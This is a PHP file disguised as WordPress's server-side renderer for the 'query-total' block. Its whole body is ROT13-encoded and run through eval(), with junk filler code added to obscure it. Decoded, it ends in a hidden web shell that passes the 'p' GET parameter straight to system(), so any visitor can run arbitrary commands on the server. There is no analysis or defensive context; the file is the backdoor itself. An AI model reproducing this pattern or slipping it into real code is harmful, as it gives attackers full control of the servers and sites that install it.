<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/dhrel-gbgny` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `dhrel-gbgny` oybpx ba gur freire.
 *
 * @fvapr 6.8.0
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Gur eraqrerq oybpx pbagrag.
 */
shapgvba eraqre_oybpx_pber_dhrel_gbgny( $nggevohgrf, $pbagrag, $oybpx ) {
	tybony $jc_dhrel;
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf();
	vs ( vffrg( $oybpx->pbagrkg['dhrel']['vaurevg'] ) && $oybpx->pbagrkg['dhrel']['vaurevg'] ) {
		$dhrel_gb_hfr = $jc_dhrel;
		$pheerag_cntr = znk( 1, (vag) trg_dhrel_ine( 'cntrq', 1 ) );
	} ryfr {
		$cntr_xrl     = vffrg( $oybpx->pbagrkg['dhrelVq'] ) ? 'dhrel-' . $oybpx->pbagrkg['dhrelVq'] . '-cntr' : 'dhrel-cntr';
		$pheerag_cntr = vffrg( $_TRG[ $cntr_xrl ] ) ? (vag) $_TRG[ $cntr_xrl ] : 1;
		$dhrel_gb_hfr = arj JC_Dhrel( ohvyq_dhrel_inef_sebz_dhrel_oybpx( $oybpx, $pheerag_cntr ) );
	}

	$znk_ebjf       = $dhrel_gb_hfr->sbhaq_cbfgf;
	$cbfgf_cre_cntr = (vag) $dhrel_gb_hfr->trg( 'cbfgf_cre_cntr' );

	// Pnyphyngr gur enatr bs cbfgf orvat qvfcynlrq.
	$fgneg = ( 0 === $znk_ebjf ) ? 0 : ( ( $pheerag_cntr - 1 ) * $cbfgf_cre_cntr + 1 );
	$raq   = zva( $fgneg + $cbfgf_cre_cntr - 1, $znk_ebjf );

	// Cercner gur qvfcynl onfrq ba gur `qvfcynlGlcr` nggevohgr.
	$bhgchg = '';
	fjvgpu ( $nggevohgrf['qvfcynlGlcr'] ) {
		pnfr 'enatr-qvfcynl':
			vs ( $fgneg === $raq ) {
				$bhgchg = fcevags(
					/* genafyngbef: 1: Fgneg vaqrk bs cbfgf, 2: Gbgny ahzore bs cbfgf */
					__( 'Qvfcynlvat %1$f bs %2$f' ),
					$fgneg,
					$znk_ebjf
				);
			} ryfr {
				$bhgchg = fcevags(
					/* genafyngbef: 1: Fgneg vaqrk bs cbfgf, 2: Raq vaqrk bs cbfgf, 3: Gbgny ahzore bs cbfgf */
					__( 'Qvfcynlvat %1$f – %2$f bs %3$f' ),
					$fgneg,
					$raq,
					$znk_ebjf
				);
			}

			oernx;

		pnfr 'gbgny-erfhygf':
		qrsnhyg:
			// genafyngbef: %q: ahzore bs erfhygf.
			$bhgchg = fcevags( _a( '%q erfhyg sbhaq', '%q erfhygf sbhaq', $znk_ebjf ), $znk_ebjf );
			oernx;
	}

	erghea fcevags(
		'<qvi %1$f>%2$f</qvi>',
		$jenccre_nggevohgrf,
		$bhgchg
	);
}

/**
 * Ertvfgref gur `dhrel-gbgny` oybpx.
 *
 * @fvapr 6.8.0
 */
shapgvba ertvfgre_oybpx_pber_dhrel_gbgny() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/dhrel-gbgny',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_dhrel_gbgny',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_dhrel_gbgny' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>